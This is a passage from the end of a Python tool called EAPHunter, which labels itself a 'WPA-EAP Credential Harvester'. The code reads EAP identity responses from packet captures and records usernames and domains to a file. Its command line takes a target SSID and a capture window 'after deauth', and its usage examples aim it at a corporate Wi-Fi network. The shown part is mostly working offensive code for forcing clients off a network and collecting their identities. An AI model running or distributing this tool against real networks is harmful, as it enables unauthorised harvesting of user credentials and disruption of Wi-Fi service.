            info(f"Certificate chain depth: {len(cert_list)}")

        print("\n  -- Certificate Details " + "-" * 40)
        _display_cert(cert_der)
        return True

    # ── Identity helpers ─────────────────────────────────────────────────────

    def _record_identity(self, identity: str):
        self.identities.append(identity)
        self._append_unique(self.out_dir / "eap_identities.txt", identity)
        if "@" in identity:
            user, domain = identity.rsplit("@", 1)
            info(f"  Username : {user}"); info(f"  Domain   : {domain}")
        elif "\\" in identity:
            domain, user = identity.split("\\", 1)
            info(f"  Domain   : {domain}"); info(f"  Username : {user}")

    def _pcap_identities(self, pcap_file: str):
        if not pcap_file or not Path(pcap_file).exists():
            return
        found = False
        for pkt in _sc.rdpcap(pcap_file):
            if not pkt.haslayer(_sc.EAP):
                continue
            eap = pkt[_sc.EAP]
            if eap.code != 2 or eap.type != 1:
                continue
            try:
                identity = eap.identity.decode(errors="replace").strip()
            except Exception:
                continue
            if identity and identity not in self.identities:
                found = True
                ok(f"EAP Identity : {identity}")
                self._record_identity(identity)
        if not found:
            warn("No EAP identities found in capture.")

    @staticmethod
    def _append_unique(path: Path, value: str):
        existing = set(path.read_text().splitlines()) if path.exists() else set()
        if value not in existing:
            with open(path, "a") as f:
                f.write(value + "\n")

    # ── Cleanup ───────────────────────────────────────────────────────────────

    def _cleanup(self):
        info("Restoring interface …")
        self._restore_managed()
        shutil.rmtree(self._tmp, ignore_errors=True)
        ok("Done.")


# ── Helpers ───────────────────────────────────────────────────────────────────
def _sorted_clients(table: dict) -> list[dict]:
    """Most recently active clients first."""
    return sorted(table.values(), key=lambda c: c["last_seen"], reverse=True)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def main():
    print("EAPHunter  —  WPA-EAP Credential Harvester\n")
    ap = argparse.ArgumentParser(
        description="WPA-EAP Credential Harvester",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  sudo python3 eaphunter.py -e CORP-WIFI -i wlan0\n"
            "  sudo python3 eaphunter.py -e CORP-WIFI -i wlan0 -c 30 -o ./results\n"
        )
    )
    ap.add_argument("-e", "--essid",     required=True, help="Target SSID")
    ap.add_argument("-i", "--interface", required=True, help="Wireless interface (e.g. wlan0)")
    ap.add_argument("-o", "--output",    default=None,  help="Output directory (auto-named)")
    ap.add_argument("-c", "--capture",   type=int, default=20,
                    help="Seconds to capture after deauth (default: 20)")
    args = ap.parse_args()

    if os.geteuid() != 0:
        die(f"Must run as root.  Try: sudo python3 {sys.argv[0]} {' '.join(sys.argv[1:])}")

    out_dir = args.output or f"./eaphunter_{args.essid.replace(' ', '_')}_{time.strftime('%Y%m%d_%H%M%S')}"
    Path(out_dir).mkdir(parents=True, exist_ok=True)

    hunter = EAPHunter(essid=args.essid, iface=args.interface,
                       out_dir=out_dir, capture_time=args.capture)

    def _sig(_s, _f):
        hunter._cleanup(); sys.exit(0)
    signal.signal(signal.SIGINT,  _sig)
    signal.signal(signal.SIGTERM, _sig)

    hunter.run()


if __name__ == "__main__":
    main()
